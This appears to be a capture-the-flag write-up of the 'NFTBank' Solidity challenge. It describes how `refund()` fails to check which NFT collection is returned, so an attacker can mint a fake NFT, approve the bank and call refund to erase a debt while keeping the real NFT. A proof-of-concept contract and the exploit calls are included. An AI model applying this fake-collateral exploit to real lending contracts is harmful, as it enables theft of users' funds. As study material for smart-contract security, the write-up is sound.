# NFTBank

## Description

`refund()` function lacks the check if anyone is adding a fake NFT.
 
An Attacker can create a fake NFT contract and call the `refund` with the new NFT deails which clear out his debt.

Attack Steps:

1. Attackers creates the newNFT and mint 1 token for himself

2. Attckers then approves the bank to rent.

3. Attackers then call the `refund()` funciton with it's collection and id of new NFT he just created.

In refund function, this for loop received the wrong address and id, the default valueu of `rentedNFTs` be 0, which is of `CryptoKitties`

```
for (uint i; i < rentNFTs.length; i++) {
            if (rentNFTs[i].collection == collection && rentNFTs[i].id == id) {
                rentedNft = rentNFTs[i];
            }
        }
```



---

## POC:

In the test solution.

```solidity

// NOTE - add this at the after  CryptoKitties contract
contract CryptoDoggies is ERC721("CryptoDoggies", "DOG"), Ownable {
    function mint(address to, uint id) external onlyOwner {
        _safeMint(to, id);
    }
}

        //solution  

        CryptoDoggies dog;
        dog = new CryptoDoggies(); // Created a new instance of Attacker's fake NFT

        dog.mint(attacker, 2); // Attacke's mint 1 NFT
        dog.approve(address(bank), 2); //Attackers permites the bank to transact on behalf of him

        bank.refund(address(dog), 2); //Attacker calling for the refund
        // now attack cleared his debt and also holding the NFT
```
